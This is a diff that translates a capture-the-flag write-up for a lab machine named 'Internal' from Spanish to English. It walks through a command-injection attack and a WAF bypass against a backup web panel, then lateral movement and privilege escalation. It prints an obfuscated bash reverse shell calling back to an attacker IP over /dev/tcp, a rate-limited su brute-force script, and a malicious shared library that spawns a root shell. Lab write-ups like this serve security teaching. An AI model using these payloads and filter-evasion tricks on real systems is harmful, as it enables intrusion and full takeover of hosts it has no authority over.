@@ -1,53 +1,39 @@
 
-# Writeup — Internal
-
-**Hecho por:** buda-sys  
-**Fecha:** 25/02/2026  
-**Dificultad:** Media
+**Made by:** buda-sys  
+**Date:** 25/02/2026  
+**Difficulty:** Easy
 
 ---
 
-**Acceso**
+## Description
 
-|Usuario|Contraseña|
-|---|---|
-|vault|Yk8$pZ5@cN4!|
+**Internal** is a machine based on a backup web application. During enumeration, we find a subdomain with a web terminal that allows listing files. Through that input we achieve command injection (RCE) by bypassing the WAF filters to obtain a reverse shell.
 
-**Servicios activos**
+Once inside, we perform internal brute-forcing. Since fail2ban blocks the IP after 3 failed attempts in 60 seconds, we can't use Hydra directly. Using the hidden password vault we found on the system, we create a Bash script to brute-force the `vault` user while respecting the attempt limit.
 
-apache2, ssh, fail2ban
+Finally, to escalate privileges we enumerate SUID binaries and find a vulnerable one to which we apply **Shared Library Hijacking** to obtain a root shell.
 
 ---
 
-## Descripción
-
-**Internal** es una máquina basada en una aplicación web de backups. Al enumerar, encontramos un subdominio con una terminal web que permite listar archivos. A través de ese input logramos inyección de comandos (RCE) evadiendo los filtros del WAF para obtener una reverse shell.
-
-Una vez dentro, realizamos fuerza bruta interna. Como fail2ban bloquea la IP si se realizan 3 intentos fallidos en 60 segundos, no podemos usar Hydra directamente. Utilizando la bóveda de contraseñas oculta que encontramos en el sistema, creamos un script en Bash para hacer fuerza bruta al usuario `vault` respetando el límite de intentos.
-
-Finalmente, para escalar privilegios enumeramos los binarios SUID y encontramos uno vulnerable al que le aplicamos **Shared Library Hijacking** para obtener una shell como root.
-
----
-
-## Cadena de ataque
+## Attack Chain
 
 ```
-Enumeración de puertos
+Port enumeration
         ↓
-Fuzzing de subdominios
+Subdomain fuzzing
         ↓
-Inyección de comandos (bypass de filtros) → Reverse Shell
+Command injection (filter bypass) → Reverse Shell
         ↓
-Fuerza bruta interna (script Bash — bypass fail2ban)
+Internal brute-force (Bash script — fail2ban bypass)
         ↓
-SUID Binary + Shared Library Hijacking → shell root
+SUID Binary + Shared Library Hijacking → root shell
 ```
 
 ---
 
-## Enumeración
+## Enumeration
 
-Empezamos enumerando los puertos abiertos de la máquina objetivo.
+We start by enumerating the open ports on the target machine.
 
 ```bash
 sudo nmap -p- --open -Pn -n -sSVC --min-rate 5000 172.17.0.2
@@ -66,17 +52,17 @@ PORT   STATE SERVICE VERSION
 |_http-title: Did not follow redirect to http://internal.dl/
 ```
 
-Observamos que los puertos **22 (SSH)** y **80 (HTTP)** están abiertos. El puerto 80 nos redirige automáticamente al dominio `internal.dl`, lo que nos revela el dominio sin necesidad de fuerza bruta. Lo agregamos al `/etc/hosts`.
+We observe that ports **22 (SSH)** and **80 (HTTP)** are open. Port 80 automatically redirects us to the domain `internal.dl`, which reveals the domain without needing brute-force. We add it to `/etc/hosts`.
 
 ```bash
 echo "172.17.0.2  internal.dl" | sudo tee -a /etc/hosts
 ```
 
-Al visitar la página web vemos que se trata de un panel de control de copias de seguridad con cifrado.
+Visiting the web page we see it's a backup control panel with encryption.
 
-![[vault.png]]
+<img src="/budahacksecurity/uploads/md_images/int/vault.png" style="max-width:100%; border-radius:8px;">
 
-Al enumerar directorios no encontramos nada relevante, pero sí un subdominio con `ffuf`.
+Directory enumeration yields nothing relevant, but we do find a subdomain with `ffuf`.
 
 ```bash
 ffuf -ic -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
@@ -86,33 +72,33 @@ ffuf -ic -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ 
 backup    [Status: 200, Size: 22554, Words: 4271, Lines: 812, Duration: 3ms]
 ```
 
-Encontramos el subdominio `backup.internal.dl`. Lo agregamos al `/etc/hosts` sin eliminar el dominio principal.
+We find the subdomain `backup.internal.dl`. We add it to `/etc/hosts` without removing the main domain.
 
 ```bash
 sudo sed -i 's/internal.dl/internal.dl backup.internal.dl/' /etc/hosts
 ```
 
-Al visitar el subdominio encontramos un administrador de copias de seguridad con una terminal web para ejecutar comandos.
+Visiting the subdomain we find a backup manager with a web terminal for executing commands.
 
-![[vault2.png]]
+<img src="/budahacksecurity/uploads/md_images/int/vault2.png" style="max-width:100%; border-radius:8px;">
 
 ---
 
-## Intrusión
+## Intrusion
 
-Al ingresar una ruta en la terminal web, vemos que el sistema la procesa con `ls -lah`. Esto indica que el input del usuario se pasa directamente a un comando del sistema, lo que sugiere una posible **inyección de comandos**.
+When entering a path in the web terminal, we see the system processes it with `ls -lah`. This indicates the user input is passed directly to a system command, suggesting a possible **command injection**.
 
-![[vault3.png]]
+<img src="/budahacksecurity/uploads/md_images/int/vault3.png" style="max-width:100%; border-radius:8px;">
 
-Al intentar inyecciones básicas, la aplicación las bloquea. Probamos los operadores `;`, `||`, `&&` y `\n` y todos son rechazados por el WAF.
+When attempting basic injections, the application blocks them. We test the `;`, `||`, `&&` and `\n` operators and all are rejected by the WAF.
 
-![[vault5.png]]
+<img src="/budahacksecurity/uploads/md_images/int/vault5.png" style="max-width:100%; border-radius:8px;">
 
-Sin embargo, los operadores `|`, `&` y `$()` no están bloqueados. Además, la aplicación acepta espacios literales, ya que el WAF solo filtra sus representaciones URL-encodeadas (`%20`, `%09`, `+`).
+However, the `|`, `&` and `$()` operators are not blocked. Additionally, the application accepts literal spaces, since the WAF only filters their URL-encoded representations (`%20`, `%09`, `+`).
 
-![[vault6.png]]
+<img src="/budahacksecurity/uploads/md_images/int/vault6.png" style="max-width:100%; border-radius:8px;">
 
-Al intentar ejecutar comandos como `whoami` o `id`, el WAF los bloquea por lista negra. Sin embargo, podemos bypassear estos filtros partiendo las palabras:
+When trying to run commands like `whoami` or `id`, the WAF blocks them via blacklist. However, we can bypass these filters by splitting the words:
 
 ```bash
 who$@ami
@@ -120,72 +106,72 @@ w'h'o'am'i
 w\h\o\am\i
 ```
 
-Con esto confirmamos que tenemos **RCE** sobre el sistema y encontramos el usuario `vault`.
+This confirms we have **RCE** on the system and we find the user `vault`.
 
-![[vault7.png]]
+<img src="/budahacksecurity/uploads/md_images/int/vault7.png" style="max-width:100%; border-radius:8px;">
 
 ### Reverse Shell
 
-**En nuestra máquina levantamos el listener con pwncat:**
+**On our machine we set up the listener with pwncat:**
 
 ```bash
 pwncat-cs -lp 4444
 ```
 
-**En la aplicación web inyectamos la reverse shell en dos pasos:**
+**In the web application we inject the reverse shell in two steps:**
 
-Primero creamos el script en `/tmp`:
+First we create the script in `/tmp`:
 
 ```bash
 /var/backups|printf${IFS}'ba''sh\t-i\t>&/dev/tcp/172.17.0.1/4444\t0>&1'>/tmp/x
 ```
 
-Luego lo ejecutamos:
+Then we execute it:
 
 ```bash
 /var/backups|ba''sh${IFS}/tmp/x
 ```
 
-![[vault8.png]]
+!<img src="/budahacksecurity/uploads/md_images/int/vault8.png" style="max-width:100%; border-radius:8px;">
 
-Este payload está **ofuscado** para bypassear los filtros:
+This payload is **obfuscated** to bypass the filters:
 
-- `${IFS}` reemplaza el espacio usando la variable interna del sistema (Internal Field Separator).
-- `ba''sh` parte la palabra `bash` en fragmentos para evadir la lista negra de comandos.
-- `\t` es un tab, que reemplaza los espacios dentro del comando de la reverse shell.
-- `/dev/tcp/172.17.0.1/4444` abre una conexión TCP hacia nuestra máquina en el puerto 4444.
-- `>&` redirige stdout y stderr al socket.
-- `0>&1` redirige stdin, dando una shell interactiva completa.
+- `${IFS}` replaces the space using the system's internal variable (Internal Field Separator).
+- `ba''sh` splits the word `bash` into fragments to evade the command blacklist.
+- `\t` is a tab, which replaces spaces inside the reverse shell command.
+- `/dev/tcp/172.17.0.1/4444` opens a TCP connection to our machine on port 4444.
+- `>&` redirects stdout and stderr to the socket.
+- `0>&1` redirects stdin, giving a fully interactive shell.
 
-![[vault9.png]]
+<img src="/budahacksecurity/uploads/md_images/int/vault9.png" style="max-width:100%; border-radius:8px;">
 
-Obtenemos acceso al sistema como `www-data`.
+We gain access to the system as `www-data`.
 
 ---
 
-## Enumeración del sistema
+## System Enumeration
 
-Una vez dentro, enumeramos el sistema con pwncat para identificar usuarios, procesos y archivos relevantes.
+Once inside, we enumerate the system with pwncat to identify relevant users, processes, and files.
 
 ```bash
 (local) pwncat$ run enumerate.gather
 ```
 
-Identificamos que el servicio **fail2ban** está activo, lo que significa que hay protección contra intentos de inicio de sesión. Si realizamos más de 3 intentos fallidos en 60 segundos, nuestra IP será bloqueada y no podremos usar herramientas como Hydra directamente.
+We identify that the **fail2ban** service is active, meaning there is protection against login attempts. If we make more than 3 failed attempts in 60 seconds, our IP will be blocked and we won't be able to use tools like Hydra directly.
 
-También encontramos los usuarios `vault` y `ubuntu` en el sistema.
+We also find the users `vault` and `ubuntu` on the system.
 
-![[vault12.png]]
+<img src="/budahacksecurity/uploads/md_images/int/vault12.png" style="max-width:100%; border-radius:8px;">
 
-Al buscar archivos ocultos en el sistema encontramos una bóveda de contraseñas:
+When searching for hidden files on the system we find a password vault:
 
 ```bash
 find / -type f -name ".*" 2>/dev/null
 ```
 
-![[vault13.png]]
+<img src="/budahacksecurity/uploads/md_images/int/vault13.png" style="max-width:100%; border-radius:8px;">
 
-Se trata de un diccionario de contraseñas almacenado en `/opt/.vault_pass.txt`:
+It's a password dictionary stored at `/opt/.vault_pass.txt`:
 
 ```
 X#9mK$vL2@pQ
@@ -212,11 +198,11 @@ Gq4@tX7#eK2&
 
 ---
 
-## Movimiento lateral — vault
+**Lateral Movement — vault**
 
-En la explicación del script agrega algo así:
+In the script explanation, add something like this:
 
-> "Antes de crear el script, revisamos la configuración de fail2ban para entender sus límites:"
+> "Before creating the script, we review the fail2ban configuration to understand its limits:"
 
 ```bash
 cat /etc/fail2ban/jail.local
@@ -229,7 +215,8 @@ findtime = 60
 bantime = 30
 ignoreip = 127.0.0.1/8 ::1
 ```
-Vemos que fail2ban está configurado para bloquear IPs externas que fallen más de 3 veces en 60 segundos, con un bantime de 30 segundos. Sin embargo, la directiva `ignoreip = 127.0.0.1/8 ::1` indica que **las conexiones desde localhost están completamente ignoradas**, lo que significa que la fuerza bruta desde dentro del sistema no será detectada ni bloqueada. Por eso atacamos desde `127.0.0.1` en lugar de hacerlo externamente."
+
+We see that fail2ban is configured to block external IPs that fail more than 3 times in 60 seconds, with a bantime of 30 seconds. However, the `ignoreip = 127.0.0.1/8 ::1` directive indicates that **connections from localhost are completely ignored**, meaning brute-force from within the system will not be detected or blocked. That's why we attack from `127.0.0.1` instead of doing it externally.
 
 ```bash
 cat > /tmp/force.sh << 'EOF'
@@ -240,56 +227,55 @@ user="vault"
 dictionary="/opt/.vault_pass.txt"
 delay=5
 
-trap "echo '[!] Abortado por el usuario'; exit 1" SIGINT SIGTERM
+trap "echo '[!] Aborted by user'; exit 1" SIGINT SIGTERM
 
-echo "[*] Iniciando fuerza bruta sigilosa contra $host"
-echo "[*] Usuario: $user"
-echo "[*] Delay: ${delay}s entre intentos"
+echo "[*] Starting stealthy brute-force against $host"
+echo "[*] User: $user"
+echo "[*] Delay: ${delay}s between attempts"
 echo ""
 
 while IFS= read -r password; do
     result=$(su -c "whoami" "$user" <<< "$password" 2>/dev/null)
 
     if [ "$result" = "$user" ]; then
-        echo "[+] CONTRASEÑA ENCONTRADA: $password"
+        echo "[+] PASSWORD FOUND: $password"
         exit 0
     else
-        echo "[-] Fallido: $password"
+        echo "[-] Failed: $password"
     fi
 
     sleep $delay
 
 done < "$dictionary"
 
-echo "[-] Wordlist agotada sin resultados"
+echo "[-] Wordlist exhausted with no results"
 EOF
 chmod +x /tmp/force.sh
 bash /tmp/force.sh
 ```
 
- obtenemos la contraseña:
+We obtain the password:
 
 ```
-[+] CONTRASEÑA ENCONTRADA: Yk8$pZ5@cN4!
+[+] PASSWORD FOUND: Yk8$pZ5@cN4!
 ```
 
-Obtenemos acceso como `vault` y encontramos la primera flag.
+We gain access as `vault` and find the first flag.
 
-
-![[vault14.png]]
+<img src="/budahacksecurity/uploads/md_images/int/vault14.png" style="max-width:100%; border-radius:8px;">
 
 ---
 
-## Escalada de privilegios
+## Privilege Escalation
 
-### Enumeración de binarios SUID
+ **SUID Binary Enumeration**
 
-Enumeramos los binarios con el bit SUID activo en el sistema:
+We enumerate binaries with the SUID bit active on the system:
 
 ```bash
 find / -perm -u=s 2>/dev/null
 
-/usr/local/bin/vaultctl   ← llamativo, no es un binario estándar del sistema
+/usr/local/bin/vaultctl   ← noteworthy, not a standard system binary
 /usr/bin/chfn
 /usr/bin/gpasswd
 /usr/bin/mount
@@ -302,47 +288,47 @@ find / -perm -u=s 2>/dev/null
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 ```
 
-El binario `/usr/local/bin/vaultctl` nos llama la atención porque no es un binario estándar del sistema. Revisamos sus permisos:
+The binary `/usr/local/bin/vaultctl` catches our attention because it's not a standard system binary. We check its permissions:
 
 ```bash
 ls -la /usr/local/bin/vaultctl
 -rwsr-xr-x 1 root vault 16136 Feb 25 15:00 /usr/local/bin/vaultctl
 ```
 
-Los permisos indican lo siguiente:
+The permissions indicate the following:
 
-- `rws` — el dueño (`root`) puede leer, escribir y ejecutar. La `s` indica que el **bit SUID está activo**.
-- `r-x` — el grupo (`vault`) puede leer y ejecutar, pero **no modificar**.
-- `r-x` — el resto de usuarios también puede leer y ejecutar.
+- `rws` — the owner (`root`) can read, write, and execute. The `s` indicates the **SUID bit is active**.
+- `r-x` — the group (`vault`) can read and execute, but **not modify**.
+- `r-x` — other users can also read and execute.
 
-Esto significa que cualquier usuario que ejecute este binario lo hará con privilegios de `root`.
+This means any user who executes this binary will do so with **root** privileges.
 
-### Análisis con strings
+ **Analysis with strings**
 
-Usamos `strings` para extraer las cadenas de texto legibles del binario y entender qué hace internamente:
+We use `strings` to extract readable text strings from the binary and understand what it does internally:
 
 ```bash
 strings /usr/local/bin/vaultctl
 ```
 
-Los datos más relevantes que encontramos:
+The most relevant data found:
 
 ```
-/opt/vaultlibs/libbackup.so   ← ruta de la librería que carga
-run_backup                    ← función que ejecuta
-dlopen                        ← carga la librería dinámicamente
-dlsym                         ← busca la función run_backup
-vaultctl.c                    ← nombre del archivo fuente original
-GCC: (Ubuntu 13.3.0)          ← compilador utilizado
+/opt/vaultlibs/libbackup.so   ← path of the library it loads
+run_backup                    ← function it executes
+dlopen                        ← dynamically loads the library
+dlsym                         ← looks up the run_backup function
+vaultctl.c                    ← original source file name
+GCC: (Ubuntu 13.3.0)          ← compiler used
 ```
 
-El binario carga dinámicamente la librería `/opt/vaultlibs/libbackup.so` usando `dlopen()` y ejecuta la función `run_backup()` con `dlsym()`. Si podemos **reemplazar esa librería con una maliciosa**, el binario SUID la ejecutará como root.
+The binary dynamically loads the library `/opt/vaultlibs/libbackup.so` using `dlopen()` and executes the `run_backup()` function via `dlsym()`. If we can **replace that library with a malicious one**, the SUID binary will execute it as root.
 
 ### Shared Library Hijacking
 
-Vamos a escalar privilegios utilizando la técnica **Shared Library Hijacking**. Al analizar el binario con `strings` identificamos que carga dinámicamente una librería `.so` usando `dlopen()`. Esto significa que el binario busca y ejecuta código desde un archivo externo en tiempo de ejecución. Si podemos reemplazar esa librería con una maliciosa, el binario SUID la ejecutará con privilegios de `root`."
+We are going to escalate privileges using the **Shared Library Hijacking** technique. By analyzing the binary with `strings` we identified that it dynamically loads a `.so` library using `dlopen()`. This means the binary searches for and executes code from an external file at runtime. If we can replace that library with a malicious one, the SUID binary will execute it with **root** privileges.
 
-Verificamos si el usuario `vault` tiene permisos de escritura en ese directorio:
+We verify if the `vault` user has write permissions on that directory:
 
 ```bash
 ls -la /opt/vaultlibs/
@@ -350,66 +336,66 @@ drwxrwxr-x 2 root  vault  4096 Feb 25 15:06 .
 -rwxrwxr-x 1 vault vault 15656 Feb 25 15:06 libbackup.so
 ```
 
-El directorio tiene permisos `rwxrwxr-x`, lo que significa que el grupo `vault` puede escribir en él. Podemos reemplazar la librería legítima con una maliciosa.
+The directory has `rwxrwxr-x` permissions, meaning the `vault` group can write to it. We can replace the legitimate library with a malicious one.
 
-Creamos la librería maliciosa:
+We create the malicious library:
 
 ```bash
-cat > /tmp/malicioso.c << 'EOF'
+cat > /tmp/malicious.c << 'EOF'
 #include <unistd.h>
 #include <stdlib.h>
 
 void run_backup() {
-    setuid(0);           // Elevar privilegios a root
+    setuid(0);           // Elevate privileges to root
     setgid(0);
-    system("/bin/bash -p");  // Lanzar shell como root
+    system("/bin/bash -p");  // Launch shell as root
 }
 EOF
 ```
 
-Compilamos la librería maliciosa y la colocamos en la ruta que carga el binario SUID:
+We compile the malicious library and place it at the path loaded by the SUID binary:
 
 ```bash
-gcc -shared -fPIC -o /opt/vaultlibs/libbackup.so /tmp/malicioso.c
+gcc -shared -fPIC -o /opt/vaultlibs/libbackup.so /tmp/malicious.c
 ```
 
-Ejecutamos el binario:
+We execute the binary:
 
 ```bash
 /usr/local/bin/vaultctl
 ```
 
-![[vault15.png]]
+<img src="/budahacksecurity/uploads/md_images/int/vault15.png" style="max-width:100%; border-radius:8px;">
 
-El binario SUID carga nuestra librería maliciosa, `setuid(0)` eleva los privilegios y obtenemos una **shell como root**.
+The SUID binary loads our malicious library, `setuid(0)` elevates the privileges and we obtain a **root shell**.
 
 ---
 
-## Análisis del WAF
+## WAF Analysis
 
-Al revisar el código fuente de la aplicación web encontramos dos capas de protección:
+When reviewing the web application's source code we found two layers of protection:
 
-**WAF** — filtraba operadores comunes de inyección: `;`, `&&`, `||`, `` ` `` y saltos de línea `\n`.
+**WAF** — filtered common injection operators: `;`, `&&`, `||`, `` ` `` and newlines `\n`.
 
-**Lista negra** — filtraba espacios URL-encodeados (`+`, `%20`, `%09`) y comandos peligrosos como `whoami`, `bash`, `cat`, `curl`, entre otros.
+**Blacklist** — filtered URL-encoded spaces (`+`, `%20`, `%09`) and dangerous commands like `whoami`, `bash`, `cat`, `curl`, among others.
 
-Sin embargo, encontramos tres fallas críticas:
+However, we found three critical flaws:
 
-**Falla 1 — Espacios literales no filtrados:** el WAF solo bloqueaba representaciones URL-encodeadas del espacio, pero no el espacio literal . Esto nos permitía usarlo directamente en los payloads.
+**Flaw 1 — Unfiltered literal spaces:** the WAF only blocked URL-encoded representations of the space, but not the literal space character. This allowed us to use it directly in payloads.
 
-**Falla 2 — Sink vulnerable:**
+**Flaw 2 — Vulnerable sink:**
 
 ```php
 $cmd = "ls -lah " . $dir . " 2>&1";
 $output = shell_exec($cmd . ' & echo ok');
 ```
 
-El input del usuario se concatena directamente al comando sin sanitización real. El operador `|` no estaba bloqueado, lo que nos permitía encadenar comandos.
+The user input is concatenated directly to the command without real sanitization. The `|` operator was not blocked, which allowed us to chain commands.
 
-**Falla 3 — Bypass de lista negra con word boundary:** los comandos bloqueados usaban `\b` (límite de palabra en regex), lo que significa que podíamos evadir el filtro partiendo las palabras con caracteres especiales:
+**Flaw 3 — Blacklist bypass with word boundary:** the blocked commands used `\b` (word boundary in regex), meaning we could bypass the filter by splitting words with special characters:
 
 ```bash
-# Bloqueado
+# Blocked
 bash
 
 # Bypass
@@ -417,4 +403,4 @@ ba''sh
 ba$@sh
 ```
 
-En resumen, los desarrolladores filtraron muchos vectores pero dejaron pasar el espacio literal y el operador `|`, lo cual fue suficiente para lograr RCE completo.
+In summary, the developers filtered many vectors but let through the literal space and the `|` operator, which was enough to achieve full RCE.
